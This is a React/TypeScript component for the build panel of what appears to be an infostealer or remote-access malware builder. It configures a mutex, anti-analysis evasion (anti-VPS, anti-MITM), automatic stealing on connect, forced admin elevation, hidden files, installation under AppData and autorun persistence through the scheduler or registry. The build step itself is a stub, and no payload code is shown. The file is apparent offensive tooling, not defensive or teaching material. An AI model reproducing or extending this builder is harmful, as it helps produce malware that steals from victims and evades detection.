import { useEffect, useRef, useState } from "react";

import { BuilderField } from "./builder-field";
import { BuilderIconField } from "./builder-icon-field";
import { BuilderNiceSelect } from "./builder-nice-select";
import { BuilderStartupDelay } from "./builder-startup-delay";
import { BuilderTextInput } from "./builder-text-input";
import { inputFixedClass } from "../styles";
import { readIcoAsBase64 } from "../utils/icon";
import { showToastSafe } from "../utils/toast";

export function BuilderForm(props: { open: boolean; mutex: string }) {
  const { open, mutex } = props;

  const [installMode, setInstallMode] = useState<string>("random");
  const [delay, setDelay] = useState<number>(2);
  const [iconBase64, setIconBase64] = useState<string>("");
  const [hidden, setHidden] = useState<boolean>(true);
  const [isOpenClass, setIsOpenClass] = useState<boolean>(false);
  const formRef = useRef<HTMLDivElement | null>(null);

  useEffect(() => {
    const el = formRef.current;
    if (!el) return;

    if (open) {
      if (hidden) setHidden(false);
      requestAnimationFrame(() => {
        setIsOpenClass(true);
      });
      return;
    }

    setIsOpenClass(false);
    const onEnd = (e: TransitionEvent) => {
      if (e.target !== el) return;
      setHidden(true);
    };
    el.addEventListener("transitionend", onEnd, { once: true });
    return () => {
      try {
        el.removeEventListener("transitionend", onEnd);
      } catch {
      }
    };
  }, [open, hidden]);

  const clampDelay = (v: number) => {
    if (!Number.isFinite(v)) return 1;
    return Math.max(1, Math.min(10, v));
  };

  useEffect(() => {
    const chooseBtn = document.getElementById("buildIconChooseBtn") as HTMLButtonElement | null;
    const clearBtn = document.getElementById("buildIconClearBtn") as HTMLButtonElement | null;
    const input = document.getElementById("buildIcon") as HTMLInputElement | null;
    const nameEl = document.getElementById("buildIconName") as HTMLDivElement | null;

    const updateName = () => {
      if (!nameEl) return;
      const fileName = input?.files?.[0]?.name;
      nameEl.textContent = fileName ? String(fileName) : "No icon selected";
    };

    const onChoose = () => {
      try {
        input?.click();
      } catch {
      }
    };

    const onClear = () => {
      setIconBase64("");
      try {
        if (input) input.value = "";
      } catch {
      }
      updateName();
    };

    const onInput = () => {
      void (async () => {
        const f = input?.files?.[0];
        if (!f) {
          setIconBase64("");
          updateName();
          return;
        }

        const res = await readIcoAsBase64(f);
        if (!res) {
          setIconBase64("");
          try {
            if (input) input.value = "";
          } catch {
          }
          updateName();
          return;
        }

        setIconBase64(res.base64);
        updateName();
      })();
    };

    updateName();

    chooseBtn?.addEventListener("click", onChoose);
    clearBtn?.addEventListener("click", onClear);
    input?.addEventListener("change", onInput);

    return () => {
      chooseBtn?.removeEventListener("click", onChoose);
      clearBtn?.removeEventListener("click", onClear);
      input?.removeEventListener("change", onInput);
    };
  }, []);

  const onCreate = () => {
    const buildName = (document.getElementById("buildName") as HTMLInputElement | null)?.value ?? "";
    const rawName = String(buildName || "").trim();
    if (!rawName) {
      showToastSafe("warning", "Enter exe name!");
      return;
    }
    if (rawName.length > 25) {
      showToastSafe("warning", "Name too long (max 25)");
      return;
    }

    const delaySec = clampDelay(delay);
    if (delaySec !== delay) setDelay(delaySec);

    void iconBase64;
    showToastSafe("info", "Build flow is being ported");
  };

  return (
    <div
      id="builderForm"
      ref={formRef}
      className={
        isOpenClass
          ? "builderForm isOpen grid place-items-center overflow-visible opacity-100 transition-[max-height,opacity,transform,margin-top] duration-[260ms] ease-[cubic-bezier(0.25,0.1,0.25,1)] [max-height:900px] [transform:translateY(0)] mt-[14px]"
          : "builderForm grid place-items-center overflow-hidden opacity-0 transition-[max-height,opacity,transform,margin-top] duration-[260ms] ease-[cubic-bezier(0.25,0.1,0.25,1)] [max-height:0] [transform:translateY(-6px)] mt-0"
      }
      hidden={hidden}
    >
      <div className="builderFormInner grid w-[min(860px,92vw)] gap-[12px] rounded-[16px] border border-[rgba(255,255,255,0.14)] bg-[rgba(32,32,32,0.64)] p-[16px] shadow-[0_18px_44px_rgba(0,0,0,0.6),0_0_0_4px_rgba(255,255,255,0.05)] backdrop-blur-[8px]">
        <div className="builderGrid grid grid-cols-2 gap-[24px]">
          <div className="builderCol grid gap-[8px]">
            <BuilderField label="name">
              <BuilderTextInput id="buildName" placeholder="name" autoComplete="off" maxLength={25} />
            </BuilderField>

            <BuilderField label="mutex">
              <BuilderTextInput id="buildMutex" value={mutex} readOnly style={{ color: "gray" }} />
            </BuilderField>

            <BuilderField label="Comment">
              <BuilderTextInput id="buildComment" placeholder="comment" autoComplete="off" maxLength={10} />
            </BuilderField>

            <BuilderField label="Anti-analysis">
              <BuilderNiceSelect
                id="antiAnalysis"
                defaultValue="None"
                options={[
                  { value: "None", label: "None" },
                  { value: "AntiMitm", label: "Anti Mitm" },
                  { value: "AntiVps", label: "Anti VPS" },
                  { value: "Full", label: "Full" },
                ]}
              />
            </BuilderField>

            <BuilderField label="Extension">
              <BuilderTextInput
                id="extension"
                value="webcrystal.exe"
                readOnly
                tabIndex={-1}
                style={{ color: "gray" }}
                className={inputFixedClass}
              />
            </BuilderField>

            <BuilderIconField />
          </div>

          <div className="builderCol grid gap-[8px]">
            <BuilderField variant="two" label="Auto Steal">
              <BuilderNiceSelect
                id="autoSteal"
                defaultValue="Once"
                options={[
                  { value: "Once", label: "Once" },
                  { value: "Every connect", label: "Every connect" },
                ]}
              />
            </BuilderField>

            <BuilderField variant="two" label="Force admin">
              <BuilderNiceSelect
                id="forceAdmin"
                defaultValue="Normal"
                options={[
                  { value: "Normal", label: "Normal" },
                  { value: "Agressive", label: "Agressive" },
                ]}
              />
            </BuilderField>

            <BuilderField variant="two" label="Install">
              <BuilderNiceSelect
                id="installMode"
                value={installMode}
                onValueChange={(v) => setInstallMode(v)}
                options={[
                  { value: "random", label: "Random" },
                  { value: "custom", label: "Custom" },
                ]}
              />
            </BuilderField>

            <BuilderField
              id="installPathRow"
              variant="two"
              label="Path"
              hidden={installMode !== "custom"}
            >
              <BuilderTextInput id="installPath" placeholder="$AppData\\build.exe" autoComplete="off" />
            </BuilderField>

            <BuilderField variant="checkbox" label="Hide files">
              <input
                id="hideFiles"
                className="builderCheck justify-self-start m-0 grid h-[18px] w-[18px] cursor-pointer appearance-none place-items-center rounded-[6px] border border-[rgba(255,255,255,0.18)] bg-[rgba(0,0,0,0.18)] shadow-[inset_0_1px_0_rgba(255,255,255,0.06)] transition-[background,border-color,transform] duration-[140ms] hover:border-[rgba(255,255,255,0.28)] active:translate-y-[1px] checked:bg-[rgba(255,75,75,0.22)] checked:border-[rgba(255,75,75,0.55)] checked:after:content-[''] checked:after:w-[10px] checked:after:h-[6px] checked:after:mt-[-1px] checked:after:border-l-[2px] checked:after:border-b-[2px] checked:after:border-[rgba(255,255,255,0.98)] checked:after:[transform:rotate(-45deg)] focus-visible:shadow-[inset_0_1px_0_rgba(255,255,255,0.06),0_0_0_3px_rgba(255,255,255,0.1)]"
                type="checkbox"
              />
            </BuilderField>

            <BuilderStartupDelay
              delay={delay}
              onMinus={() => setDelay((v) => clampDelay(v - 1))}
              onPlus={() => setDelay((v) => clampDelay(v + 1))}
            />

            <BuilderField variant="two" label="Autorun">
              <BuilderNiceSelect
                id="autorun"
                defaultValue="scheduler"
                options={[
                  { value: "scheduler", label: "Scheduler" },
                  { value: "scheduler_registry", label: "Scheduler + Registry" },
                  { value: "registry", label: "Registry" },
                  { value: "none", label: "None" },
                ]}
              />
            </BuilderField>
          </div>
        </div>

        <div id="buildProgress" className="buildProgress grid w-full place-items-center py-[10px]" hidden>
          <div className="buildProgressInner grid h-[210px] w-[min(520px,90vw)] place-items-center rounded-[16px] border border-[rgba(255,255,255,0.14)] bg-[rgba(32,32,32,0.64)] shadow-[0_18px_40px_rgba(0,0,0,0.55),0_0_0_4px_rgba(255,255,255,0.05)] backdrop-blur-[10px]">
            <div id="buildProgressText" className="buildProgressText text-[18px] font-bold text-[rgba(255,255,255,0.92)]">
              Building
            </div>
          </div>
        </div>

        <div className="builderFooter mt-[8px] grid justify-items-center gap-[12px]">
          <div className="builderTabs flex w-full flex-col items-center gap-[4px]" role="tablist" aria-label="Builder tabs">
            <button
              id="createBtn"
              className="builderTab isActive w-[180px] cursor-pointer appearance-none rounded-[12px] border border-[rgba(255,255,255,0.14)] bg-[rgba(20,20,20,0.35)] px-[20px] py-[10px] text-center text-[14px] font-extrabold text-[rgba(255,255,255,0.92)] transition-[background,border-color,transform] duration-[140ms] hover:bg-[rgba(255,255,255,0.04)] hover:border-[rgba(255,255,255,0.18)] active:translate-y-[1px] [border-bottom:4px_solid_var(--line)]"
              type="button"
              data-tab="create"
              onClick={onCreate}
            >
              Create
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}
